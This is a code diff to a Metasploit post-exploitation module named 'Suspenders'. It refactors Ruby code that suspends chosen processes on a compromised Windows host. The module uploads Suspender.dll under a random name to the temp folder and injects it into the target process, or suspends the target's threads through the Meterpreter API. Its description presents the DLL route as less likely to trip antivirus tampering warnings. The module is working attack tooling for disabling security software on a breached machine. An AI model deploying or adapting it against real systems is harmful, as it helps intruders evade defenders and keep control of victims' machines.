@@ -4,7 +4,7 @@
 #
 #
 # TODO:
-# -> x64 support
+# -> Test x64 support
 
 require 'msf/core'
 #require 'msf/core/post/common'
@@ -17,18 +17,20 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super( update_info( info,
 				'Name' => 'Suspenders',
-				'Description' => %q{ This module suspends a list of given processes after a given 
+				'Description' => %q{ This module suspends a list of given processes after a given
 				delay.  This is accomplished one of two ways.  First, Suspender.dll can be injected
 				into the target process.  Second, the meterpreter API can be used to suspend each
-				thread in the target process.  To use the Suspender.dll approach you'll have to 
+				thread in the target process.  To use the Suspender.dll approach you'll have to
 				download Suspender.dll (just once), see References for URL.  The module will
 				check for the dll at data/suspender/x86/Suspender.dll when a path is not given.  The
 				minimum delay for the dll method is 1 second and 0 will automatically be increased.
-				The Suspender.dll method currently requires a file upload to the target, however it's 
+				The Suspender.dll method currently requires a file upload to the target, however it's
 				less likely to trigger a "tampering" warning from certain processes (such as AV
 				processes) than the meterpreter API method.  PIDs will be suspended in the order
 				they are listed, and process names, if any, will be translated to pids and appended,
-				in order, to the list of PIDs (however no process will be suspended twice).
+				in order, to the list of PIDs (however no process will be suspended twice).  The
+				current process in which meterpreter is running is automatically blocked from
+				suspension (for your protection).
 
 				This module is a port of the meterpreter script of the same name by kerberos, which
 				was inspired by mubix's blog which was inpsired by Didier Stevens' Suspender.dll. },
@@ -48,13 +50,18 @@ class Metasploit3 < Msf::Post
 		))
 		register_options(
 			[
-				OptString.new('PIDS', [false, 'Target process ID list, comma seperated, to suspend', nil]),
-				OptString.new('PROCESSES', [false, 'Target process names, comma sep, to suspend (this or PIDS must be set)', nil]),
+				OptString.new('PIDS', [false, 'Target process ID list, comma seperated, to suspend',
+					nil]),
+				OptString.new('PROCESSES', [false,
+					'Target process names, comma sep, to suspend (this or PIDS must be set)', nil]),
 				OptInt.new('DELAY', [true, 'The delay, in seconds, to wait before suspension', 0]),
 			#	OptBool.new('UNSUSPEND', [false, 'I am not sure this can be implemented',false]),
-				OptBool.new('USE_DLL', [true, 'Do NOT use Suspender.dll, this method might bother AVs',true]),
-				@suspender = OptPath.new('SUSPENDER_DLL', [false, "Local path to the Suspender.dll, req'd if USE_DLL is true", nil]),
-				OptBool.new('HALT', [true, 'Halt further suspension if any failure is encountered', false]),
+				OptBool.new('USE_DLL', [true,
+					'Do NOT use Suspender.dll, this method might bother AVs',true]),
+				@@suspender = OptPath.new('SUSPENDER_DLL', [false,
+					"Local path to the Suspender.dll, req'd if USE_DLL is true", nil]),
+				OptBool.new('HALT', [true, 'Halt further suspension if any failure is encountered',
+					false]),
 			], self.class)
 	end
 
@@ -78,11 +85,11 @@ class Metasploit3 < Msf::Post
 		tempdir = session.fs.file.expand_path("%TEMP%") || "C:\\"
 		if datastore['USE_DLL']
 			# TODO:  validate this the fancy way using OptPath.valid?
-			if @suspender.valid?(datastore['SUSPENDER_DLL'])
+			if @@suspender.valid?(datastore['SUSPENDER_DLL'])
 				suspender = datastore['SUSPENDER_DLL']
 			else
 				susp_path = ::File.join(Msf::Config.data_directory,'suspender','x86','Suspender.dll')
-				if @suspender.valid?(susp_path)
+				if @@suspender.valid?(susp_path)
 					suspender = susp_path
 				else
 					raise OptionValidateError.new('SUSPENDER_DLL'),
@@ -91,55 +98,83 @@ class Metasploit3 < Msf::Post
 			end
 		end
 		uploadpath = "#{tempdir}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}#{delay.to_s}.dll"
-		halt = datastore['HALT']
+		@@halt = datastore['HALT']
 
 		# check that pids and/or process names are provided and that pid != 0
 		if ( (pids.empty? or pids.include?(0)) and (processes.empty?) )
 			# suspending PID 0 will eventually bork the box
-			print_error "PIDS and PROCESSES can't both be empty... and PIDS can't be 0"
-			return nil
+			print_error "PIDS and PROCESSES can't both be empty... and PIDS can't contain 0"
+			raise Rex::Script::Completed
 		end
 
 		# resolve the pids if nec
-		if ( processes and not processes.empty? ) 
+		if ( processes and not processes.empty? )
 			print_status "Resolving the process names to PIDs"
-			processes.each do |process|
-				pid = client.sys.process[process] # returns the first process encountered w/this name
-				if ( pid and pid != 0 )
-					pids << pid
-					print_good "Found PID:  #{pid}"
-				else
-					if pid == 0
-						if halt
-							print_error "Found PID 0, halting"
-							return nil
-						else 
-							print_error "Found PID 0, skipping it for your protection"
-						end
-					else
-						if halt
-							print_error "Could not find a process with the name #{process}, halting"
-							return nil
-						else					
-							print_error "Could not find a process with the name #{process}, skipping it"
-						end
-					end
-				end
-			end
+			pids = pids + resolve_process_names_to_pids(processes)
 		end
 		
-		# convert all pids to integers to avoid problems down the road and allow a uniq call
-		pids.each_with_index do |pid,idx| 
-			pids[idx] = pid.to_i
+		# validate (& cleanup) pids
+		pids = validate_pids(pids)
+
+		if pids.empty?
+			print_error "No valid pids were supplied.  Exiting."
+			raise Rex::Script::Completed # should we skip the stack trace on this error state?
 		end
-		# unique'ify the pids
-		pids.uniq!
 
 		# proceed based on which method was chosen
 		if datastore['USE_DLL']
 			suspend_using_dll(pids,delay,uploadpath,suspender)
 		else # use the meterpreter api
 			suspend_using_api(pids,delay)
+		end
+	end
+
+	def resolve_process_names_to_pids(processes)
+		return [] if (processes.class != Array or processes.empty?)
+		pids = []
+		processes.each do |process|
+			pid = client.sys.process[process] # returns first process encountered w/this name
+			if pid 
+				pids << pid
+				print_status "Found PID:  #{pid}"
+			else
+				check_halt "Could not find a process with the name #{process}..."
+			end
+		end
+		pids
+	end
+
+	def validate_pids(pids)
+		# do the following to each pid:
+		# - convert to integer
+		# - remove pid 0 to protect the system's stability
+		# - remove the current meterp pid to avoid suspending our own process
+		# - remove redundant entries
+		return [] if (pids.class != Array or pids.empty?)
+		clean_pids = []
+		mypid = client.sys.process.getpid
+		pids.each do |pid|
+			next if pid.nil?
+			ppid = pid.to_i
+			if ppid == 0
+				check_halt "Found PID 0 in the list, removing..."
+			elsif ppid == mypid.to_i
+				check_halt "Found my own PID in the list, removing..."
+			else
+				clean_pids << pid
+			end
+		end
+		# return unique'ified pids
+		clean_pids.uniq
+	end
+
+	def check_halt(msg,halt=@@halt)
+		print_error msg
+		if halt
+			print_error "Halting.  (set HALT false to change this behavior)"
+			raise Rex::Script::Completed
+		else
+			print_status "Continuing..."
 		end
 	end
 
@@ -158,14 +193,8 @@ class Metasploit3 < Msf::Post
 				end
 			end
 		rescue ::Rex::Post::Meterpreter::RequestError => e
-			print_error "There was an error suspending the process threads:  #{e.to_s}"
-			print_error "You may not have the correct permissions (PROCESS_ALL_ACCESS)"
-			if halt
-				print_error "Halting."
-				return nil
-			else
-				print_status "Continuing..."
-			end
+			print_error "Error suspending the process threads:  #{e.to_s}"
+			check_halt "You may not have the correct permissions (PROCESS_ALL_ACCESS)..."
 		ensure
 			targetprocess.close if targetprocess
 		end
@@ -180,8 +209,8 @@ class Metasploit3 < Msf::Post
 			pay.datastore['EXITFUNC'] = 'thread'
 			raw = pay.generate
 		rescue RuntimeError => e
-			print_error("Error generating payload #{e.to_s}")
-			return nil
+			print_error("Error generating payload #{e.to_s}, can't continue.")
+			raise Rex::Script::Completed
 		end
 		begin
 			# Upload suspender to target
@@ -191,8 +220,8 @@ class Metasploit3 < Msf::Post
 			session.fs.file.upload_file("#{uploadpath}", "#{suspender}")
 			# TODO:  inject directly into memory instead of uploading first
 		rescue Rex::Post::Meterpreter::RequestError => e
-			print_error "Can't continue, error uploading Suspender.dll:  #{e.to_s}"
-			return nil
+			print_error "Error uploading Suspender.dll:  #{e.to_s}, can't continue"
+			raise Rex::Script::Completed
 		end
 		# do injects
 		proc = nil
@@ -206,13 +235,8 @@ class Metasploit3 < Msf::Post
 				print_status("Executing payload")
 				targetprocess.thread.create(mem, 0)
 			rescue Rex::Post::Meterpreter::RequestError => e
-				print_error "Error injecting payload {e.to_s}, you may not have permission"
-				if halt
-					print_error "Halting."
-					return nil
-				else
-					print_error "Continuing..."
-				end
+				print_error "Error injecting payload {e.to_s}, you may not have permission..."
+				check_halt "You may not have the correct permissions (PROCESS_ALL_ACCESS)..."
 			ensure
 				# Let's ensure we close the open process if it's open
 				targetprocess.close if targetprocess
